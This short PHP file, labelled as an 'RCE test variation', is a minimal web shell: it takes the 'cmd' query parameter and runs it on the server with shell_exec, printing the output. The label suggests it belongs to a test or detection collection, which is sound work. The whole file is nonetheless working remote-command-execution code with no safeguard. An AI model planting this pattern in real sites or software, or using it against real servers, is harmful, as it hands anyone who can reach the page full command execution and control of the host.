<?php
// RCE test variation #582
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>